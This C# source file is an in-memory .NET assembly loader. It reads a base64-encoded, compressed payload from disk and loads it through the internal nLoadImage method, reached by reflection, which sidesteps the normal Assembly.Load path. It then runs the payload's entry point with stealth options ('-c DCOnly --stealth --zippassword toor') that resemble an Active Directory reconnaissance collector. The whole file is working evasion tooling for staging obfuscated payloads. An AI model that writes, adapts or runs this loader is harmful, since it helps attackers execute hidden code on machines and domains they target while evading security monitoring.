using System;
using System.Runtime.InteropServices;
using System.Reflection;
using System.IO;
using System.IO.Compression;
using System.Threading;
using System.Security;
namespace Run
{
	
	public class Run
	{
		[STAThread]
		public static void Main(string[] args)
		{
			/*
			var adm = typeof(System.AppDomain).Assembly.GetType("System.AppDomain");
			AppDomain root = AppDomain.CurrentDomain;
			FieldInfo fi = adm.GetField("_domainManager",BindingFlags.NonPublic | BindingFlags.Instance);
			AppDomainManager a = (AppDomainManager)fi.GetValue(root);
			Console.WriteLine("ADM: " + a);
			*/
			string aaa = File.ReadAllText(args[0]);
			byte[] a = Decompress(Convert.FromBase64String(aaa));
			var scm = typeof(System.Threading.Thread).Assembly.GetType("System.Threading.StackCrawlMark");
			object val = Enum.ToObject(scm, 1);
			var adm = typeof(System.AppDomain).Assembly.GetType("System.AppDomain");
			var sadmt = adm.GetMethod("SetAppDomainManagerType", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
			var kernel32 = typeof(System.Reflection.Assembly).Assembly.GetType("System.Reflection.RuntimeAssembly");
			var VirtualAlloc = kernel32.GetMethod("nLoadImage", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
            		Console.WriteLine("nLoad:" + VirtualAlloc.MethodHandle.GetFunctionPointer().ToString("X"));
			Console.WriteLine("SetADM:" + sadmt.MethodHandle.GetFunctionPointer().ToString("X"));
			Console.WriteLine("Calling Load");
			Console.Read();
			var assem = (Assembly) VirtualAlloc.Invoke(null, new object[] { a, null, null, val, false, false, SecurityContextSource.CurrentAssembly });
			Console.WriteLine(assem.FullName);
			var codeBase = assem.GetType().GetProperty("FullName",System.Reflection.BindingFlags.NonPublic);
			foreach (FieldInfo property in assem.GetType().GetFields(BindingFlags.Instance | BindingFlags.NonPublic |BindingFlags.Public))
			{
				Console.WriteLine(property.Name);
			}
			
			//Assembly assem = Assembly.Load(a);
			MethodInfo mi = assem.EntryPoint;
			string[] p = new string[] {"-c", "DCOnly", "--stealth", "--zippassword","toor"};	
			mi.Invoke(null,new object[] { p });
			
			
		
		}
		public static byte[] Decompress(byte[] data)
        {
            MemoryStream input = new MemoryStream(data);
            MemoryStream output = new MemoryStream();
            using (DeflateStream dstream = new DeflateStream(input, CompressionMode.Decompress))
            {
                dstream.CopyTo(output);
            }
            return output.ToArray();
        }
		
	}
}
